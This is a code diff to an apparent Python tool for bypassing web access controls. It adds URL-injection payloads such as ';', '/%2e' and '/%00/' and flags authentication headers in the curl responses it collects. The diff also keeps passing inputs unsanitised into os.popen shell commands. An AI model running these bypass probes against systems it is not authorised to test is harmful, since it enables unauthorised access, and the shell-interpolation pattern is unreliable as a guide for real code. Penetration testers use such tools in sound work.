@@ -25,31 +25,38 @@ BANNER = r"""
 
 
 def host_header_injection(header, defined_url):
+    indicator = ""
     command = os.popen("curl -k -s -I -X GET -H \"%s\" %s" % (header, defined_url))
     method = "GET"
     text = command.read()
     status = text.strip().split(" ")[1]
     length = text.strip().split(" ")[12].split()[0]
+    if "Authenticate" in text:
+        indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}")
     elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {header} {YELLOW}{indicator}{RSTCOLORS}")
 
 def http_methods(method, defined_url):
+    indicator = ""
     command = os.popen("curl -k -s -I -X %s %s" % (method, defined_url))
     text = command.read()
     status = text.strip().split(" ")[1]
     length = text.strip().split(" ")[12].split()[0]
+    if "Authenticate" in text:
+        indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}")
     elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {defined_url}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {defined_url} {YELLOW}{indicator}{RSTCOLORS}")
     
 def url_injection(payload, defined_url):
+    indicator = ""
     uri = defined_url.split("/")[-1]
     uri = "/"+uri
     method = "GET"
@@ -58,27 +65,35 @@ def url_injection(payload, defined_url):
     command = os.popen("curl -k -s -I '%s'" % (payload_url))
     text = command.read()
     status = text.strip().split(" ")[1]
-    length = text.strip().split(" ")[12].split()[0]
-    if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url}")
-    elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url}")
+    if "Authenticate" in text:
+        indicator = "--> AUTH"
+    if "Content-Length" not in text:
+        length = "0"
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url}")
+        length = text.strip().split(" ")[12].split()[0]
+    if int(status) == 200:
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    elif int(status) > 299 and int(status) < 400:
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
+    else:
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
 
 def url_end_injection(payload, defined_url):
+    indicator = ""
     payload_url = defined_url + payload
     method = "GET"
     command = os.popen("curl -k -s -I '%s'" % (payload_url))
     text = command.read()
     status = text.strip().split(" ")[1]
     length = text.strip().split(" ")[12].split()[0]
+    if "Authenticate" in text:
+        indicator = "--> AUTH"
     if int(status) == 200:
-        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url}")
+        return(f"{GREEN}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     elif int(status) > 299 and int(status) < 400:
-        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url}")
+        return(f"{YELLOW}{status}{RSTCOLORS},{method},{payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     else:
-        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url}")
+        return(f"{RED}{status}{RSTCOLORS},{method},{length} {payload_url} {YELLOW}{indicator}{RSTCOLORS}")
     
 def banner():
     print(BANNER)
@@ -124,13 +139,17 @@ else:
 #/////////////////////URL Injections//////////////////////////
     print(f"{BLUE}[+]Trying url injections{RSTCOLORS}")
     print(url_injection("/;", url))
+    print(url_injection(";", url))
     print(url_injection(";/", url))
     print(url_injection(";/;", url))
     print(url_injection("//", url))
     print(url_injection("/.;", url))
     print(url_injection("/%2e", url))
+    print(url_injection("%2e", url))
+    print(url_injection("/%00/", url))
     print(url_injection("/.;/:", url))
     print(url_injection("/;foo=bar", url))
+    print(url_injection(";foo=bar", url))
     print(url_injection("/;foo=bar;", url))
     print(url_end_injection("%20/", url)) 
     print(url_end_injection("/%09/", url))
